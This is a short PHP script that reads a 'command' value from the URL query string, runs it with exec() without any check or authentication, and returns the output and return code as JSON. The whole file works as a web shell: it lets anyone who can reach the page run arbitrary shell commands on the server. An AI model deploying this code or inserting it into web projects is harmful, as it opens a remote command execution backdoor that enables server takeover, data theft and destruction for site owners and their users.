<?php

$error = false;
$result = array();

$command = $_GET['command'];

if($command){

    exec($command,$output,$retval);

    $result = array(
        "error" => false,
        "command" => $command,
        "output" => $output,
        "retval" => $retval
    );

}else{
    $error = true;
}

if($error){
    $result = array(
        "error" => true,
        "message" => "Missing data for exec command"
    );
}

echo json_encode($result);
